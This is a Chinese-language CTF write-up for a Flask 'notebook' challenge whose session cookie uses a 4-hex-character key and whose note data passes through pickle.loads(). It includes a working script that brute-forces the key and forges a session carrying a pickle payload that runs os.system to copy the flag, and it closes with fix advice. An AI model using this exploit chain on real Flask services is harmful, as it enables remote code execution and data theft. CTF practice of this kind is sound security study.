# notebook

## 题目简述

题目把笔记对象序列化后保存在 Flask 客户端 session 中，并在查看笔记时直接执行 `pickle.loads()`。正常情况下 session Cookie 只能读取、不能在不知道密钥时伪造，但题目使用 `os.urandom(2).hex()` 生成签名密钥，密钥空间只有 $2^{16}=65536$。爆破密钥后即可伪造包含恶意 Pickle 的 session，并在服务器上执行命令。

## 解题过程

### 1. 确认两处漏洞能够串联

密钥配置为：

```python
app.config['SECRET_KEY'] = os.urandom(2).hex()
```

两个随机字节转成十六进制后仅有 4 个字符，取值范围是 `0000` 到 `ffff`。Flask 默认 session 数据存放在客户端 Cookie 中，Cookie 经过签名但没有加密；因此能看到其中的数据，而拿到正确密钥后还能重新签名任意内容。

查看笔记时，服务端从 session 取出字节串并直接反序列化：

```python
def render_note(note_id, notes):
    note_raw = notes.get(note_id)
    note = pickle.loads(note_raw)
    return render_template(
        'note.html',
        note_id=note_id,
        note_name=note.name,
        note_content=note.content,
    )
```

所以完整利用链是：获取合法 Cookie → 爆破 4 位十六进制密钥 → 伪造恶意 `notes` → 访问对应 `note_id` 触发反序列化。

### 2. 爆破密钥并签发恶意 Cookie

先正常添加一条笔记，从浏览器中复制名为 `session` 的 Cookie。下面的代码直接复用 Flask 的签名序列化器，不依赖第三方爆破工具；应使用与题目兼容的 Flask/itsdangerous 版本运行。

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

cookie = "<合法的 session Cookie>"
app = Flask(__name__)
serializer = None
secret = None

for value in range(0x10000):
    candidate = f"{value:04x}"
    app.secret_key = candidate
    current = SecureCookieSessionInterface().get_signing_serializer(app)
    try:
        current.loads(cookie)
    except Exception:
        continue

    secret = candidate
    serializer = current
    break

if secret is None:
    raise RuntimeError("secret key not found")

print(f"secret = {secret}")

# protocol 0 Pickle：调用 os.system，将 flag 复制到 Flask 的静态目录。
payload = b"cos\nsystem\n(S'cp /flag /app/static/flag.txt'\ntR."
forged = serializer.dumps({"notes": {"evil": payload}})
print(forged)
```

这里手工使用 Pickle protocol 0 的 `GLOBAL`、`TUPLE` 和 `REDUCE` 操作码调用 `os.system`，因此不会出现“在 Windows 上生成 `nt.system`、放到 Linux 后无法导入”的平台差异。

将浏览器中的 `session` Cookie 替换为输出值，再访问 `/evil`。页面返回 `500` 是预期现象：`pickle.loads()` 已先执行 `cp`，但 `os.system()` 返回整数，后续访问 `note.name` 时才抛出异常。最后访问 `/static/flag.txt` 即可读取复制出的 flag。该路径可用是因为 Dockerfile 将源码复制到 `/app`，而应用自身已有 `/app/static` 静态目录；容器也没有切换到低权限用户。

```text
0xGame{750fdbdf-1155-4cac-818e-8918a6ff0bf4}
```

## 方法总结

本题把弱 session 密钥与 Pickle 反序列化组合成了 RCE。单看客户端 session 或 `pickle.loads()` 都不足以完成利用，关键是先恢复签名能力，再把恶意字节串放进服务端信任的数据结构。修复时应使用足够长且持久化的随机密钥，并彻底避免对客户端可控数据使用 Pickle，改用 JSON 等无代码执行语义的格式。
